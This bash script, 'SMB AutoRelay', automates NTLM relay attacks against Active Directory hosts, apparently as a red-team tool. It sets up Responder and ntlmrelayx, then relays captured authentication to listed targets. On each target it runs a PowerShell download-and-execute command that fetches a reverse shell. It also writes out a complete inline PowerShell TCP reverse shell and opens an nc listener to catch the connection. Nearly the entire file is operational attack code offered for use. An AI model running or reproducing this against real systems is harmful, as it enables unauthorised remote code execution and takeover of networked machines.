#!/bin/bash

# Name: SMB AutoRelay
# Author: chesire
# 
# Description: SMB AutoRelay provides the automation of SMB/NTLM Relay technique for pentesting and red teaming exercises in active directory environments.
# Usage: ./smbAutoRelay.sh -i <interface> -t <TargetsFilePath>
# Example: ./smbAutoRelay -i eth0 -t ./targets.txt
# Note: targets.txt only store a list of IP addresses that you want to perform the relay.
#

# ################## DISCLAIMER ##################
# I AM NOT RESPONSIBLE OF THE MISUSE OF THIS TOOL.
# YOU RUN IT AT YOUR OWN RISK. PLEASE BE KIND :)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected! Exiting...";
	tmux kill-session -t 'smbautorelay*' &>/dev/null
	tput cnorm
	exit 1
}

function banner(){
	echo -e "${greenColour}"
    echo -e "   _____ __  _______     ___         __        ____       __
  / ___//  |/  / __ )   /   | __  __/ /_____  / __ \___  / /___ ___  __
  \__ \/ /|_/ / __  |  / /| |/ / / / __/ __ \/ /_/ / _ \/ / __ \`/ / / /
 ___/ / /  / / /_/ /  / ___ / /_/ / /_/ /_/ / _, _/  __/ / /_/ / /_/ / 
/____/_/  /_/_____/  /_/  |_\__,_/\__/\____/_/ |_|\___/_/\__,_/\__, /  
                                                              /____/   "
	echo -e "${endColour}"
	sleep 1
}

function helpMenu(){
	echo -e "${blueColour}Usage: ./smbAutoRelay.sh -i eth0 -t ./targets.txt${endColour}"
	echo -e "\n\t${purpleColour}i) Interface to listen for NetNTLM hashes${endColour}"
    echo -e "\n\t${purpleColour}t) File path to the list of targets${endColour}"
    echo -e "\n\t${purpleColour}r) Remove all installed software${endColour}"
	echo -e "\n\t${purpleColour}h) Shows this help menu${endColour}"
	tput cnorm; exit 0
}

function checkApt(){
	which $1 &>/dev/null
	if [ $? -eq 0 ];then
		echo -e "\t${greenColour}[:)]${endColour} $1 installed\n";sleep 1
	else
		echo -e "\t${yellowColour}[:S]${endColour} $1 not installed, installing..."; sleep 1
		apt install -y $1 &>/dev/null
		which $1 &>/dev/null
		if [ $? -eq 0 ];then
			echo -e "\t${greenColour}[:S]${endColour} $1 installed\n"; sleep 1
            echo "$1" >> $(pwd)/unnistall.txt
		else
			echo -e "\t${redColour}[:S]${endColour} Something bad happened, $1 could not be installed. Exiting...\n"; sleep 1
			exit 1
		fi
	fi
}

function checkProgramsNeeded(){

    programs=(tmux rlwrap python python3 netcat)

	echo -e "${blueColour}[*]${endColour} Checking for dependencies needed...\n"; sleep 1
	
    which $(pwd)/responder/Responder.py &>/dev/null
	if [ $? -eq 0 ]; then
		echo -e "\t${greenColour}[:)]${endColour} Responder installed\n"; sleep 1
	else
      echo -e "\t${yellowColour}[:S]${endColour} Responder not installed, installing in '$(pwd)/responder' directory";sleep 1
      mkdir $(pwd)/responder; git clone https://github.com/lgandx/Responder.git $(pwd)/responder &>/dev/null
      if [ $? -eq 0 ]; then
        chmod u+x $(pwd)/responder/Responder.py
        echo -e "\t${greenColour}[:)]${endColour} Respoder installed sucessfully!\n"; sleep 1
        echo "responder" >> $(pwd)/unninstall.txt
      else
	    echo -e "\t${redColour}[:S]${endColour} Something bad happened, responder could not be installed. Exiting...\n"; sleep 1; exit 1
		fi
	fi

	which $(pwd)/ntlmrelayx.py &>/dev/null
	if [ $? -eq 0 ]; then
		echo -e "\t${greenColour}[:)]${endColour} ntlmrelayx.py installed\n";sleep 1
	else
		echo -e "\t${yellowColour}[:S]${endColour} ntlmrelayx.py not found, downloading in $(pwd) directory"; sleep 1
		wget "https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py" -O "$(pwd)/ntlmrelayx.py" &>/dev/null
        /bin/ls "$(pwd)/ntlmrelayx.py" &>/dev/null
		if [ $? -eq 0 ]; then
			chmod u+x "$(pwd)/ntlmrelayx.py"
			echo -e "\t${greenColour}[:)]${endColour} ntlmrelayx.py downloaded succesfully!\n"; sleep 1
			echo "ntlmrelayx" >> unninstall.txt
		else
			echo -e "\t${redColour}[:S]${endColour} Something bad happened, ntlmrelayx.py could not be installed. Exiting...\n"; sleep 1; exit 1
		fi
	fi

	for program in "${programs[@]}"; do
		checkApt $program
    done
}

function checkResponderConfig(){
	echo -e "${blueColour}[*]${endColour} Checking responder config..."

	SMBStatus=$(grep "^SMB" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')
	HTTPStatus=$(grep -E "^HTTP" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')

	/bin/ls $(pwd)/responder/Responder.conf.old &>/dev/null
	if [ $? -ne 0 ];then
      echo -e "\n\t${blueColour}[*]${endColour} Making copy of original config file to $(pwd)/responder/Responder.conf.old\n"; sleep 1
		cp $(pwd)/responder/Responder.conf $(pwd)/responder/Responder.conf.old
	fi

	if [ $SMBStatus == "On" ]; then
		echo -e "\t${yellowColour}[:S]${endColour} Responder SMB server enabled, switching off..."; sleep 1
		sed 's/SMB = On/SMB = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
	    mv $(pwd)/responder/Responder.conf.tmp $(pwd)/responder/Responder.conf
        rm -f $(pwd)/responder/Responder.conf.tmp 
	fi

	if [ $HTTPStatus == "On" ]; then
		echo -e "\t${yellowColour}[:S]${endColour} Responder HTTP server enabled, switching off..."; sleep 1
        which $(pwd)/responder/Responder.conf.tmp &>/dev/null
        sed 's/HTTP = On/HTTP = Off/' $(pwd)/responder/Responder.conf > $(pwd)/responder/Responder.conf.tmp
	    mv $(pwd)/responder/Responder.conf.tmp $(pwd)/responder/Responder.conf
        rm -f $(pwd)/responder/Responder.conf.tmp
	fi

	echo -e "\n\t${greenColour}[:)]${endColour} Responder SMB and HTTP servers disabled. Starting Relay Attack...\n"; sleep 1
}

function relayingAttack(){

  echo -e "${blueColour}[*]${endColour} Starting Tmux server...\n"; sleep 1
  tmux start-server && sleep 2

  echo -e "${blueColour}[*]${endColour} Creating Tmux session: smbautorelay...\n"; sleep 1
  tmux new-session -d -t "smbautorelay"
  tmux rename-window "smbautorelay" && tmux split-window && tmux select-pane -t 1

  echo -e "${blueColour}[*]${endColour} Tmux setted up. Launching Responder...\n"; sleep 1
  tmux send-keys "python3 $(pwd)/responder/Responder.py -I eth0 -drw" C-m && sleep 0.5

  lhost=$(ifconfig $interface | grep "inet\s" | awk '{print $2}')
  lport=$(($RANDOM%65535))

  openPorts=($(netstat -tunalp | grep -v 'Active\|Proto' | grep 'tcp' | awk '{print $4}' | awk -F: '{print $NF}' | sort -u | xargs))
  for openPort in "${openPorts[@]}"; do
    lport=$(($RANDOM%65535))
    if [ $lport -ne $openPort ];then break; fi
  done

  echo -e "${blueColour}[*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 1
  wget 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1' -O $(pwd)/shell.ps1 &>/dev/null
  if [ ! -e "$(pwd)/shell.ps1" ];then
   echo -e "${yellowColour}[:S]${endColour} Unable to get nishang payload. Let's try crafting it manually...\n"; sleep 1
   rshell='$client = New-Object System.Net.Sockets.TCPClient("'$lhost'",'$lport');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
   echo $rshell > $(pwd)/shell.ps1
  else
    echo 'Invoke-PowerShellTcp -Reverse -IPAddress '$lhost' -Port '$lport >> $(pwd)/shell.ps1
  fi

  echo -e "${blueColour}[*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 1
  tmux select-pane -t 2 && tmux send-keys "python3 -m http.server" C-m && sleep 0.5 && tmux split-window -h

  echo -e "${blueColour}[*]${endColour} Launching ntlmrelayx.py\n"; sleep 1
  command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
  tmux select-pane -t 3 && tmux send-keys "python $(pwd)/ntlmrelayx.py -tf $targets -smb2support -c \"$command\"" C-m && sleep 0.5


  echo -e "${blueColour}[*]${endColour} $lport port open to receive the connection\n"; sleep 1
  gnome-terminal --window --hide-menubar -e "rlwrap nc -lvvnp $lport" > /dev/null 2>&1 &
  gnome_nc_PID=$!

  sleep 5

  portStatus=$(netstat -tunalp | grep $lport | awk '{print $6}' | sort -u)
  while [ "$portStatus" == "LISTEN" ];do
    portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u)
    sleep 1
  done

  if [ "$portStatus" == "ESTABLISHED" ];then
    echo -e "${greenColour}[:D]${endColour} Relay succesful! Enjoy your shell!\n"; sleep 1
  else
    echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 1
  fi
  echo -e "${blueColour}[*]${endColour} Killing Tmux session: smbautorelay\n"; sleep 1
  tmux kill-session -t "smbautorelay*"
  rm -f $(pwd)/shell.ps1 &>/dev/null

}

function rmsw(){

  if [ ! -e $(pwd)/unninstall.txt ];then
    echo -e "${greenColour}[:)]${endcolour} Nothing to unninstall\n"
    tput cnorm; exit 0
  fi

  echo -ne "${redColour}[!!]${endColour} Are you sure you want to unninstall $(cat $(pwd)/unninstall.txt | xargs | sed 's/ /, /g')? (y/n): "; read confirm

  while [[ "$confirm" != "y" && "$confirm" != "n" ]];do
    echo -ne "Please type y or n: ";read confirm
  done

  if [ "$confirm" == "y" ];then
    echo -e "\n$yellowColour[!!]${endColour} Unninstalling process started, please do not stop the process...\n"; sleep 1
    while read line; do
      if [ "$line" == "responder" ];then
        rm -rf $(pwd)/responder &>/dev/null
      elif [ "$line" == "ntlmrelayx" ];then
        rm -f $(pwd)/ntlmrelayx.py &>/dev/null
      else
        apt remove -y $line &>/dev/null
      fi
      if [ $? -ne 0 ];then
        echo -e "\t${redColour}[D:]${endColour} Unable to unninstall $line. Try manually\n"; sleep 1
      else
        echo -e "\t${greenColour}[:)]${endColour} $line unninstaled\n"; sleep 1
      fi
    done < $(pwd)/unninstall.txt
    rm -f $(pwd)/unninstall.txt
    tput cnorm; exit 0
  else
    tput cnorm: exit 0
  fi
}

# Main function
banner
if [ "$(id -u)" == 0 ]; then 
	tput civis

	declare -i parameter_counter=0; while getopts "ri:t:h" arg; do
		case $arg in
            r) rmsw;;
			i) interface=$OPTARG; let parameter_counter+=1 ;;
			t) targets=$OPTARG; let parameter_counter+=1 ;;
			h) helpMenu;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		helpMenu
	else
        ifconfig $interface &>/dev/null
        if [ $? -ne 0 ];then
          echo -e "${redColour}[D:]${endColour} $interface interface not found\n"; tput cnorm; exit 1
        fi

        if [ ! -e $targets ]; then
          echo -e "${redColour}[D:]${endcolour} $targets file does not exists\n"; tput cnorm; exit 1
        fi

		checkProgramsNeeded
		checkResponderConfig
        relayingAttack
	fi

	tput cnorm; exit 0

else
	echo -e "\n${redColour}[!!] Super powers not activated!${endColour}\n${blueColour}[*] You need root privileges to run this tool!${endColour}"; tput cnorm; exit 1
fi
